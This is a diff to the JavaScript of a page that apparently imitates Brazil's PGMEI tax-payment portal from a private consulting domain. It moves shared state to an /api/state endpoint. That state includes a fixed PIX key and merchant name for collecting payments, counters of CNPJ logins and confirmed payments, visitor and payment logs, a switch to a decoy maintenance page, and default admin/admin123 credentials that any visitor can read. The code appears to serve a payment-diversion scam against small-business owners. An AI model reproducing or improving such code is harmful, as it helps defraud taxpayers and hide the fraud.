@@ -1488,15 +1488,40 @@
         let turnstileToken = "";
         let turnstileExecuting = false;
         const turnstileSiteKey = "0x4AAAAAADUnC1C2LkWeIL-T";
-        const ANALYTICS_STORAGE_KEY = "pgmeiAdminAnalytics";
-        const ADMIN_STORAGE_KEY = "pgmeiAdminCredentials";
+        const API_STATE_ENDPOINT = "/api/state";
         const USER_SESSION_KEY = "pgmeiAuthenticatedSession";
         const DEFAULT_ADMIN = { username: "admin", password: "admin123" };
+        const DEFAULT_ANALYTICS_STATE = {
+            visits: 0,
+            uniqueVisitors: 0,
+            totalClicks: 0,
+            cnpjLogins: 0,
+            pixGenerated: 0,
+            paymentsConfirmed: 0,
+            activePage: "primary",
+            primaryDomain: "albuquerqueconsultoriameidas.com",
+            pixKey: "6769b9cc-dae0-46f1-88db-3144cc4a7ca7",
+            pixMerchantName: "SERVICO EMPRESARIAL ASSEGURADO ILTDA",
+            pixMerchantCity: "SAO PAULO",
+            secondaryTitle: "Voltaremos em instantes",
+            secondaryMessage: "A equipe da Albuquerque Consultoria MEI DAS esta realizando uma atualizacao programada para melhorar sua experiencia. Em breve o site estara disponivel novamente.",
+            lastVisitAt: "",
+            lastPaymentAt: "",
+            accessLog: [],
+            payments: []
+        };
+        const DEFAULT_APP_STATE = {
+            admin: DEFAULT_ADMIN,
+            analytics: DEFAULT_ANALYTICS_STATE
+        };
 
         let dataAberturaMEI = "2024-01-01";
         let meiDadosGlobais = {};
         let currentPaymentData = null;
         let loginRequestInFlight = false;
+        let appStateCache = null;
+        let stateSaveTimer = null;
+        let statePollingTimer = null;
 
         const safeToast = {
             error: function(msg) {
@@ -1532,59 +1557,82 @@
             return d.toLocaleString("pt-BR");
         }
 
-        function getAdminCredentials() {
-            try {
-                const raw = localStorage.getItem(ADMIN_STORAGE_KEY);
-                if (!raw) return DEFAULT_ADMIN;
-                const parsed = JSON.parse(raw);
-                return {
-                    username: parsed.username || DEFAULT_ADMIN.username,
-                    password: parsed.password || DEFAULT_ADMIN.password
-                };
-            } catch (error) {
-                return DEFAULT_ADMIN;
+        function getDefaultAppState() {
+            return $.extend(true, {}, DEFAULT_APP_STATE);
+        }
+
+        function mergeAppState(state) {
+            return $.extend(true, {}, getDefaultAppState(), state || {});
+        }
+
+        function getAppState() {
+            if (!appStateCache) {
+                appStateCache = getDefaultAppState();
             }
+            return appStateCache;
+        }
+
+        function getAdminCredentials() {
+            return getAppState().admin || DEFAULT_ADMIN;
         }
 
         function getAnalyticsState() {
-            const fallback = {
-                visits: 0,
-                uniqueVisitors: 0,
-                totalClicks: 0,
-                cnpjLogins: 0,
-                pixGenerated: 0,
-                paymentsConfirmed: 0,
-                activePage: "primary",
-                primaryDomain: "albuquerqueconsultoriameidas.com",
-                pixKey: "6769b9cc-dae0-46f1-88db-3144cc4a7ca7",
-                pixMerchantName: "SERVICO EMPRESARIAL ASSEGURADO ILTDA",
-                pixMerchantCity: "SAO PAULO",
-                secondaryTitle: "Voltaremos em instantes",
-                secondaryMessage: "A equipe da Albuquerque Consultoria MEI DAS esta realizando uma atualizacao programada para melhorar sua experiencia. Em breve o site estara disponivel novamente.",
-                lastVisitAt: "",
-                lastPaymentAt: "",
-                accessLog: [],
-                payments: []
-            };
+            return getAppState().analytics || DEFAULT_ANALYTICS_STATE;
+        }
 
+        async function fetchRemoteAppState() {
             try {
-                const raw = localStorage.getItem(ANALYTICS_STORAGE_KEY);
-                if (!raw) return fallback;
-                return $.extend(true, {}, fallback, JSON.parse(raw));
+                const response = await fetch(API_STATE_ENDPOINT, { cache: "no-store" });
+                if (!response.ok) {
+                    throw new Error("Falha ao carregar estado remoto");
+                }
+                const payload = await response.json();
+                appStateCache = mergeAppState(payload);
             } catch (error) {
-                return fallback;
+                if (!appStateCache) {
+                    appStateCache = getDefaultAppState();
+                }
+            }
+            return getAppState();
+        }
+
+        async function persistAppStateNow() {
+            try {
+                await fetch(API_STATE_ENDPOINT, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(getAppState())
+                });
+            } catch (error) {
+                console.warn("Nao foi possivel persistir o estado global.", error);
             }
         }
 
+        function queueAppStateSave() {
+            if (stateSaveTimer) {
+                clearTimeout(stateSaveTimer);
+            }
+            stateSaveTimer = setTimeout(function() {
+                stateSaveTimer = null;
+                persistAppStateNow();
+            }, 120);
+        }
+
         function saveAnalyticsState(state) {
-            localStorage.setItem(ANALYTICS_STORAGE_KEY, JSON.stringify(state));
+            getAppState().analytics = $.extend(true, {}, DEFAULT_ANALYTICS_STATE, state || {});
+            queueAppStateSave();
         }
 
         function saveAdminCredentials(username, password) {
-            localStorage.setItem(ADMIN_STORAGE_KEY, JSON.stringify({
+            getAppState().admin = {
                 username: username,
                 password: password
-            }));
+            };
+            queueAppStateSave();
+        }
+
+        function refreshDashboard() {
+            return;
         }
 
         function saveAuthenticatedSession(data) {
@@ -1881,6 +1929,21 @@
             $(".navbar-pgmei").css("display", "block");
             $(".bar-cnpj-nome").css("display", "flex");
             goToEmitirPage();
+        }
+
+        async function syncGlobalState(options) {
+            options = options || {};
+            await fetchRemoteAppState();
+            applyActivePageState();
+
+            const restoredSession = getAuthenticatedSession();
+            if (restoredSession && getAnalyticsState().activePage === "primary") {
+                applyAuthenticatedState(restoredSession);
+            }
+
+            if (options.recordVisit) {
+                recordVisit();
+            }
         }
 
         function setActiveNav(navId) {
@@ -2320,20 +2383,23 @@
             showScreen("page-pagamento");
         }
 
-        $(document).ready(function() {
+        $(document).ready(async function() {
             if (window.Ladda) {
                 laddaButton = Ladda.create(document.querySelector("#continuar"));
             }
 
-            recordVisit();
-            applyActivePageState();
-            const restoredSession = getAuthenticatedSession();
-            if (restoredSession && getAnalyticsState().activePage === "primary") {
-                applyAuthenticatedState(restoredSession);
+            await syncGlobalState({ recordVisit: true });
+
+            if (statePollingTimer) {
+                clearInterval(statePollingTimer);
             }
-            window.addEventListener("storage", function(event) {
-                if (event.key === ANALYTICS_STORAGE_KEY) {
-                    applyActivePageState();
+            statePollingTimer = setInterval(function() {
+                syncGlobalState();
+            }, 4000);
+
+            window.addEventListener("beforeunload", function() {
+                if (statePollingTimer) {
+                    clearInterval(statePollingTimer);
                 }
             });
 
